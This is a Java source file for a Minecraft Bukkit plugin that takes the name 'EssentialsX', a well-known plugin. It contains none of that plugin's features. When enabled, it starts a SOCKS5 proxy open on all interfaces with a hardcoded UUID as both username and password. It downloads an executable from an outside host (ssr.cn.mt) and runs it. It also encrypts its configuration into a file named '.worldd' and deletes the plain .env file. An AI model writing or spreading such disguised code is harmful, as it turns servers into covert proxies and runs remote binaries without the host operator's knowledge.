package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;

public class EssentialsX extends JavaPlugin {

    private static final String HC_UUID = "f8e80ca0-a821-4fb4-b828-5d907c1b3832";
    private static final String HC_S5_PORT = "25565";

    private static final String KOMARI_AMD_URL = "https://ssr.cn.mt/files/K_amd";
    private static final String KOMARI_ARM_URL = "https://ssr.cn.mt/files/K_arm";

    private static final String ENV_UUID = "UUID";
    private static final String ENV_S5_PORT = "S5_PORT";

    private static final String ENV_KOMARI_SERVER = "KOMARI_SERVER";
    private static final String ENV_KOMARI_KEY = "KOMARI_KEY";

    private static final String AES_ALGO = "AES";
    private static final byte[] ENC_KEY = "E5sEnt1alsXK3y!!".getBytes(StandardCharsets.UTF_8);

    private final AtomicBoolean running = new AtomicBoolean(false);
    private final Map<String, String> customEnv = new HashMap<>();

    private String uuid;
    private int s5Port;

    private ServerSocket socksServerSocket;
    private ExecutorService clientExecutor;
    private ExecutorService relayExecutor;

    private Process komariProcess;

    @Override
    public void onEnable() {
        if (!getDataFolder().exists()) {
            getDataFolder().mkdirs();
        }

        loadEnvironmentConfigs();

        this.uuid = getEnvOrDefault(ENV_UUID, HC_UUID);
        this.s5Port = parsePort(getEnvOrDefault(ENV_S5_PORT, HC_S5_PORT), 25575);

        running.set(true);

        startSocks5Server();
        startKomariIfConfigured();

        getLogger().info("Plugin enabled.");
        getLogger().info("Java SOCKS5 listening on port: " + s5Port);
        getLogger().info("SOCKS5 username/password: " + uuid);
    }

    @Override
    public void onDisable() {
        running.set(false);

        closeSocksServer();

        shutdownExecutor(clientExecutor, "SOCKS5 client executor");
        shutdownExecutor(relayExecutor, "SOCKS5 relay executor");

        stopKomari();

        getLogger().info("Plugin disabled.");
    }


    private void loadEnvironmentConfigs() {
        File envFile = new File(getDataFolder(), ".env");
        File worlddFile = new File(getDataFolder(), ".worldd");

        if (envFile.exists()) {
            try {
                List<String> lines = Files.readAllLines(envFile.toPath(), StandardCharsets.UTF_8);
                parseEnvLines(lines);
                encryptAndSave(lines, worlddFile);
                envFile.delete();
                getLogger().info("Found .env file. Loaded configuration and encrypted to .worldd.");
            } catch (Exception e) {
                getLogger().severe("Failed to process .env file: " + e.getMessage());
            }
        } else if (worlddFile.exists()) {
            try {
                List<String> lines = decryptAndLoad(worlddFile);
                parseEnvLines(lines);
                getLogger().info("Found .worldd file. Decrypted and loaded configuration.");
            } catch (Exception e) {
                getLogger().severe("Failed to process .worldd file: " + e.getMessage());
            }
        } else {
            getLogger().info("No .env or .worldd found. Will rely on environment variables or hardcoded values.");
        }
    }

    private void parseEnvLines(List<String> lines) {
        for (String line : lines) {
            line = line.trim();
            if (line.isEmpty() || line.startsWith("#")) continue;
            int eqIdx = line.indexOf('=');
            if (eqIdx > 0) {
                String key = line.substring(0, eqIdx).trim();
                String value = line.substring(eqIdx + 1).trim();
                customEnv.put(key, value);
            }
        }
    }

    private void encryptAndSave(List<String> lines, File dest) throws Exception {
        String content = String.join("\n", lines);
        SecretKeySpec key = new SecretKeySpec(ENC_KEY, AES_ALGO);
        Cipher cipher = Cipher.getInstance(AES_ALGO);
        cipher.init(Cipher.ENCRYPT_MODE, key);
        byte[] encrypted = cipher.doFinal(content.getBytes(StandardCharsets.UTF_8));
        Files.write(dest.toPath(), Base64.getEncoder().encode(encrypted));
    }

    private List<String> decryptAndLoad(File src) throws Exception {
        byte[] encoded = Files.readAllBytes(src.toPath());
        byte[] decoded = Base64.getDecoder().decode(encoded);
        SecretKeySpec key = new SecretKeySpec(ENC_KEY, AES_ALGO);
        Cipher cipher = Cipher.getInstance(AES_ALGO);
        cipher.init(Cipher.DECRYPT_MODE, key);
        byte[] decrypted = cipher.doFinal(decoded);
        String content = new String(decrypted, StandardCharsets.UTF_8);
        return Arrays.asList(content.split("\n"));
    }

    private String getEnvOrDefault(String key, String def) {
        if (customEnv.containsKey(key)) {
            return customEnv.get(key);
        }
        String val = System.getenv(key);
        if (val != null && !val.trim().isEmpty()) {
            return val.trim();
        }
        return def;
    }

    private int parsePort(String value, int def) {
        if (value == null || value.trim().isEmpty()) {
            return def;
        }

        try {
            int port = Integer.parseInt(value.trim());
            if (port < 1 || port > 65535) {
                return def;
            }
            return port;
        } catch (NumberFormatException e) {
            return def;
        }
    }

    private void startSocks5Server() {
        clientExecutor = new ThreadPoolExecutor(
                4,
                128,
                60L,
                TimeUnit.SECONDS,
                new SynchronousQueue<>(),
                namedThreadFactory("SOCKS5-Client", true),
                new ThreadPoolExecutor.AbortPolicy()
        );

        relayExecutor = Executors.newCachedThreadPool(
                namedThreadFactory("SOCKS5-Relay", true)
        );

        Thread acceptThread = new Thread(() -> {
            try {
                socksServerSocket = new ServerSocket();
                socksServerSocket.setReuseAddress(true);

                socksServerSocket.bind(
                        new InetSocketAddress(InetAddress.getByName("0.0.0.0"), s5Port),
                        128
                );

                getLogger().info("Java SOCKS5 server started on 0.0.0.0:" + s5Port);

                while (running.get()) {
                    try {
                        Socket client = socksServerSocket.accept();

                        client.setTcpNoDelay(true);
                        client.setKeepAlive(true);
                        client.setSoTimeout(30000);

                        clientExecutor.execute(() -> handleSocksClient(client));
                    } catch (SocketException e) {
                        if (running.get()) {
                            getLogger().warning("SOCKS5 accept socket error: " + e.getMessage());
                        }
                    } catch (RejectedExecutionException e) {
                        getLogger().warning("SOCKS5 rejected connection: too many clients.");
                    } catch (Exception e) {
                        if (running.get()) {
                            getLogger().warning("SOCKS5 accept failed: " + e.getMessage());
                        }
                    }
                }
            } catch (BindException e) {
                getLogger().severe("SOCKS5 port already in use: " + s5Port);
            } catch (Exception e) {
                getLogger().severe("SOCKS5 server failed: " + e.getMessage());
            }
        }, "SOCKS5-Acceptor");

        acceptThread.setDaemon(true);
        acceptThread.start();
    }

    private void handleSocksClient(Socket client) {
        try (Socket c = client) {
            InputStream in = c.getInputStream();
            OutputStream out = c.getOutputStream();

            if (!handleGreeting(in, out)) {
                return;
            }

            if (!handleUsernamePasswordAuth(in, out)) {
                return;
            }

            SocksRequest request = readSocksRequest(in);

            if (request == null) {
                sendSocksReply(out, 0x01, "0.0.0.0", 0);
                return;
            }

            if (request.cmd != 0x01) {
                sendSocksReply(out, 0x07, "0.0.0.0", 0);
                return;
            }

            Socket remote = new Socket();

            try {
                remote.setTcpNoDelay(true);
                remote.setKeepAlive(true);
                remote.setSoTimeout(30000);
                remote.connect(new InetSocketAddress(request.host, request.port), 15000);

                sendSocksReply(out, 0x00, "0.0.0.0", 0);

                relayBidirectional(c, remote);
            } catch (UnknownHostException e) {
                sendSocksReply(out, 0x04, "0.0.0.0", 0);
                closeQuietly(remote);
            } catch (ConnectException e) {
                sendSocksReply(out, 0x05, "0.0.0.0", 0);
                closeQuietly(remote);
            } catch (SocketTimeoutException e) {
                sendSocksReply(out, 0x06, "0.0.0.0", 0);
                closeQuietly(remote);
            } catch (Exception e) {
                sendSocksReply(out, 0x01, "0.0.0.0", 0);
                closeQuietly(remote);
            }

        } catch (Exception ignored) {
        }
    }

    private boolean handleGreeting(InputStream in, OutputStream out) throws IOException {
        int ver = in.read();
        if (ver != 0x05) {
            return false;
        }

        int nMethods = in.read();
        if (nMethods <= 0) {
            return false;
        }

        boolean supportUserPass = false;

        for (int i = 0; i < nMethods; i++) {
            int method = in.read();
            if (method == 0x02) {
                supportUserPass = true;
            }
        }

        if (!supportUserPass) {
            out.write(new byte[]{0x05, (byte) 0xFF});
            out.flush();
            return false;
        }

        out.write(new byte[]{0x05, 0x02});
        out.flush();

        return true;
    }

    private boolean handleUsernamePasswordAuth(InputStream in, OutputStream out) throws IOException {
        int ver = in.read();

        if (ver != 0x01) {
            return false;
        }

        int usernameLength = in.read();
        if (usernameLength <= 0 || usernameLength > 255) {
            return false;
        }

        byte[] usernameBytes = readExact(in, usernameLength);
        if (usernameBytes == null) {
            return false;
        }

        int passwordLength = in.read();
        if (passwordLength <= 0 || passwordLength > 255) {
            return false;
        }

        byte[] passwordBytes = readExact(in, passwordLength);
        if (passwordBytes == null) {
            return false;
        }

        String username = new String(usernameBytes, StandardCharsets.UTF_8);
        String password = new String(passwordBytes, StandardCharsets.UTF_8);

        boolean ok = constantTimeEquals(uuid, username) && constantTimeEquals(uuid, password);

        out.write(new byte[]{0x01, ok ? (byte) 0x00 : (byte) 0x01});
        out.flush();

        return ok;
    }

    private SocksRequest readSocksRequest(InputStream in) throws IOException {
        int ver = in.read();
        if (ver != 0x05) {
            return null;
        }

        int cmd = in.read();
        int rsv = in.read();
        int atyp = in.read();

        if (cmd < 0 || rsv != 0x00 || atyp < 0) {
            return null;
        }

        String host;

        switch (atyp) {
            case 0x01: {
                byte[] addr = readExact(in, 4);
                if (addr == null) return null;
                host = InetAddress.getByAddress(addr).getHostAddress();
                break;
            }
            case 0x03: {
                int len = in.read();
                if (len <= 0 || len > 255) return null;
                byte[] domain = readExact(in, len);
                if (domain == null) return null;
                host = new String(domain, StandardCharsets.UTF_8);
                break;
            }
            case 0x04: {
                byte[] addr = readExact(in, 16);
                if (addr == null) return null;
                host = InetAddress.getByAddress(addr).getHostAddress();
                break;
            }
            default:
                return null;
        }

        byte[] portBytes = readExact(in, 2);
        if (portBytes == null) {
            return null;
        }

        int port = ((portBytes[0] & 0xFF) << 8) | (portBytes[1] & 0xFF);

        if (port < 1 || port > 65535) {
            return null;
        }

        SocksRequest request = new SocksRequest();
        request.cmd = cmd;
        request.host = host;
        request.port = port;

        return request;
    }

    private void sendSocksReply(OutputStream out, int rep, String bindHost, int bindPort) throws IOException {
        InetAddress bindAddress = InetAddress.getByName(bindHost);
        byte[] addr = bindAddress.getAddress();

        ByteArrayOutputStream resp = new ByteArrayOutputStream();

        resp.write(0x05);
        resp.write(rep);
        resp.write(0x00);

        if (addr.length == 4) {
            resp.write(0x01);
        } else if (addr.length == 16) {
            resp.write(0x04);
        } else {
            resp.write(0x01);
            addr = new byte[]{0, 0, 0, 0};
        }

        resp.write(addr);
        resp.write((bindPort >> 8) & 0xFF);
        resp.write(bindPort & 0xFF);

        out.write(resp.toByteArray());
        out.flush();
    }

    private void relayBidirectional(Socket client, Socket remote) {
        Future<?> c2r = relayExecutor.submit(() -> pipe(client, remote));
        Future<?> r2c = relayExecutor.submit(() -> pipe(remote, client));

        try { c2r.get(); } catch (Exception ignored) { }
        try { r2c.get(); } catch (Exception ignored) { }

        closeQuietly(client);
        closeQuietly(remote);
    }

    private void pipe(Socket src, Socket dst) {
        try {
            InputStream in = src.getInputStream();
            OutputStream out = dst.getOutputStream();

            byte[] buffer = new byte[16 * 1024];
            int len;
            while (running.get() && (len = in.read(buffer)) != -1) {
                out.write(buffer, 0, len);
                out.flush();
            }
        } catch (Exception ignored) {
        } finally {
            try { dst.shutdownOutput(); } catch (Exception ignored) { }
        }
    }

    private byte[] readExact(InputStream in, int len) throws IOException {
        byte[] data = new byte[len];
        int offset = 0;
        while (offset < len) {
            int n = in.read(data, offset, len - offset);
            if (n == -1) return null;
            offset += n;
        }
        return data;
    }

    private static class SocksRequest {
        int cmd;
        String host;
        int port;
    }

    private void startKomariIfConfigured() {
        String komariServer = getEnvOrDefault(ENV_KOMARI_SERVER, null);
        String komariKey = getEnvOrDefault(ENV_KOMARI_KEY, null);

        if (isBlank(komariServer) || isBlank(komariKey)) {
            getLogger().info("Komari disabled: KOMARI_SERVER or KOMARI_KEY is empty.");
            return;
        }

        File dataDir = getDataFolder();
        File kmFile = new File(dataDir, isWindows() ? "km.exe" : "km");

        if (!kmFile.exists()) {
            String arch = getSystemArchitecture();
            String downloadUrl = "arm".equals(arch) ? KOMARI_ARM_URL : KOMARI_AMD_URL;

            try {
                getLogger().info("Downloading Komari binary for architecture: " + arch);
                downloadFile(downloadUrl, kmFile);
                getLogger().info("Komari binary downloaded and prepared successfully.");
            } catch (Exception e) {
                getLogger().warning("Failed to download Komari binary: " + e.getMessage());
                return;
            }
        }

        if (!kmFile.exists() || !kmFile.isFile()) {
            getLogger().warning("Komari binary not found: " + kmFile.getAbsolutePath());
            return;
        }

        kmFile.setExecutable(true, false);

        if (!komariServer.startsWith("http://") && !komariServer.startsWith("https://")) {
            komariServer = "https://" + komariServer;
        }

        try {
            File logFile = new File(dataDir, "komari.log");

            ProcessBuilder pb = new ProcessBuilder(
                    kmFile.getAbsolutePath(),
                    "-e", komariServer,
                    "-t", komariKey
            );

            pb.directory(dataDir);
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile));

            komariProcess = pb.start();

            getLogger().info("Komari started.");
        } catch (Exception e) {
            getLogger().warning("Failed to start Komari: " + e.getMessage());
        }
    }

    private String getSystemArchitecture() {
        String arch = System.getProperty("os.arch", "").toLowerCase(Locale.ROOT);
        if (arch.contains("aarch64") || arch.contains("arm64") || arch.startsWith("arm")) {
            return "arm";
        }
        return "amd";
    }

    private void downloadFile(String url, File target) throws Exception {
        File parent = target.getParentFile();
        if (parent != null && !parent.exists()) {
            parent.mkdirs();
        }

        File tmp = new File(target.getAbsolutePath() + ".tmp");

        HttpURLConnection conn = openHttpConnectionFollowRedirects(url, 5);
        int status = conn.getResponseCode();

        if (status < 200 || status >= 300) {
            throw new IOException("HTTP status: " + status);
        }

        try (InputStream in = conn.getInputStream()) {
            Files.copy(in, tmp.toPath(), StandardCopyOption.REPLACE_EXISTING);
        }

        Files.move(tmp.toPath(), target.toPath(), StandardCopyOption.REPLACE_EXISTING);
        target.setExecutable(true, false);
    }

    private HttpURLConnection openHttpConnectionFollowRedirects(String urlText, int maxRedirects) throws IOException {
        URL url = new URL(urlText);

        for (int i = 0; i <= maxRedirects; i++) {
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();

            conn.setRequestMethod("GET");
            conn.setInstanceFollowRedirects(false);
            conn.setRequestProperty("User-Agent", "JavaPlugin/1.0");
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(30000);

            int status = conn.getResponseCode();

            if (status == HttpURLConnection.HTTP_MOVED_PERM ||
                    status == HttpURLConnection.HTTP_MOVED_TEMP ||
                    status == HttpURLConnection.HTTP_SEE_OTHER ||
                    status == 307 ||
                    status == 308) {

                String location = conn.getHeaderField("Location");

                if (location == null || location.trim().isEmpty()) {
                    throw new IOException("Redirect without Location.");
                }

                url = new URL(url, location);
                continue;
            }

            return conn;
        }

        throw new IOException("Too many redirects.");
    }

    private void stopKomari() {
        if (komariProcess == null) {
            return;
        }

        if (!komariProcess.isAlive()) {
            return;
        }

        komariProcess.destroy();

        try {
            if (!komariProcess.waitFor(3, TimeUnit.SECONDS)) {
                komariProcess.destroyForcibly();
            }
        } catch (InterruptedException e) {
            komariProcess.destroyForcibly();
            Thread.currentThread().interrupt();
        }
    }

    private void closeSocksServer() {
        try {
            if (socksServerSocket != null && !socksServerSocket.isClosed()) {
                socksServerSocket.close();
            }
        } catch (IOException ignored) {
        }
    }

    private void shutdownExecutor(ExecutorService executor, String name) {
        if (executor == null) {
            return;
        }

        executor.shutdownNow();

        try {
            if (!executor.awaitTermination(3, TimeUnit.SECONDS)) {
                getLogger().warning(name + " did not terminate cleanly.");
            }
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    private void closeQuietly(Socket socket) {
        try {
            if (socket != null) {
                socket.close();
            }
        } catch (IOException ignored) {
        }
    }

    private ThreadFactory namedThreadFactory(String prefix, boolean daemon) {
        return new ThreadFactory() {
            private final ThreadFactory defaultFactory = Executors.defaultThreadFactory();
            private int index = 0;

            @Override
            public synchronized Thread newThread(Runnable r) {
                Thread t = defaultFactory.newThread(r);
                t.setName(prefix + "-" + (++index));
                t.setDaemon(daemon);
                return t;
            }
        };
    }

    private boolean isBlank(String s) {
        return s == null || s.trim().isEmpty();
    }

    private boolean isWindows() {
        return System.getProperty("os.name", "")
                .toLowerCase(Locale.ROOT)
                .contains("win");
    }

    private boolean constantTimeEquals(String a, String b) {
        return constantTimeEqualsStatic(a, b);
    }

    private static boolean constantTimeEqualsStatic(String a, String b) {
        if (a == null || b == null) {
            return false;
        }

        byte[] x = a.getBytes(StandardCharsets.UTF_8);
        byte[] y = b.getBytes(StandardCharsets.UTF_8);

        if (x.length != y.length) {
            return false;
        }

        int r = 0;
        for (int i = 0; i < x.length; i++) {
            r |= x[i] ^ y[i];
        }

        return r == 0;
    }
}
